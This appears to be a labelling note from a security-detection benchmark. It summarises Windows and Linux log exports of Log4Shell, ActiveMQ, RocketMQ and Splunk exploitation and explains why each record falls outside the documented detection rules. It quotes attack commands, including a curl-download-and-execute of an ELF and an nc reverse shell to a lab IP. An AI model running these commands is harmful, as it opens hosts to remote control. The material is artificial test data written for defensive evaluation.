Splunk classic Security log (28,794 records, mostly 5156; win-dc-128 and win-host-987, 2021-12-15 20:40:16-20:45:15). It comes from the same run and window as H93. It holds Splunk forwarder child processes, a SIHClient run, and an RDP logon of ATTACKRANGE\Administrator from 72.43.121.35 (4624 type 10, 4648, 4776, AES 4768/4769). The rest is machine-account network logons, SYSVOL reads and DC WFP connections. There is no trace of the Log4Shell activity: no java process creation, and no event mentions 10.0.1.16. Nothing falls in any detection's documented scope:
- the only 4769 (Rec 1621635347) is AES 0x12 for the machine account WIN-HOST-987$;
- the only 4768 (Rec 1621635345) succeeded (0x0);
- there are no 4771 or 4625 failures and no 1102;
- none of the 80 4688 records matches a process-creation selection.

Sysmon (4,458 records, win-dc-128 and win-host-987, 2021-12-15 20:40:10-20:45:09). It records the Log4Shell callback on win-host-987: java.exe (pid 1068, ATTACKRANGE\Administrator) accepts 10.0.1.16:38332 -> 10.0.1.15:8080, then connects to 10.0.1.16:1389 (LDAP) and 10.0.1.16:8080 at 20:43:21. No child process of java is recorded. The rest is background:
- all 78 EID 1 are Splunk forwarder helpers or the RDP logon chain (smss, csrss, winlogon, LogonUI, dwm, rdpclip, atbroker, TSTheme);
- the only LSASS handles are svchost (lsm.dll) with 0x1400/0x101001, which lack PROCESS_VM_READ, so they are not in T1003.001's scope;
- registry writes are W32Time, DFSR and terminal-input, with no Run keys;
- the DC shows LDAP, Kerberos and DNS traffic.

Linux Sysmon, 4 records stitched from separate SnapAttack captures (hosts ubuntu and ip-10-0-254-161, 2022-2023):
- ActiveMQ 5.18.0 exploitation (CVE-2023-46604 style): root runs `sh -c curl -s -o test.elf http://192.168.196.163/test.elf; chmod +x ./test.elf; ./test.elf` in the ActiveMQ bin directory;
- RocketMQ 5.1.0 exploitation (CVE-2023-33246 style): `sh -c $@|sh . echo nc 192.168.196.133 4444 -e /bin/bash;...`;
- splunkd writes shell.xsl into a search dispatch directory (CVE-2023-46214 style XSLT upload);
- a bash runs under the postgres account in the PostgreSQL data directory.

labels.reason:
Exploited services run Unix shell commands (T1059.004), but none is in the documented scope:
- no Base64 is decoded; RocketMQ pipes plain `echo` output into sh (susp_b64_pipe needs a Base64 decode piped into the shell);
- the downloaded ELF is written to and run from the ActiveMQ working directory, not /tmp, /var/tmp or /dev/shm (the README lists other writable directories as a coverage gap), and its own process start is not recorded;
- each shell's first argument is -c or nothing, not a temp-directory script.

A web-app RCE running a Base64 dropper through sh -c is T1059.004 behaviour, but this record is outside the documented scope:
- the decoded output is redirected into a file, not piped into sh/bash/dash/zsh/ksh (susp_b64_pipe);
- Image /bin/dash is not under a temp directory (susp_tmp_binary);
- the shell's first argument is -c, not a temp-directory script (tmp_script_shell/tmp_script_path).
The next step, starting /tmp/mBZXM, would match susp_tmp_binary, but its process creation is not in this Java-filtered export.
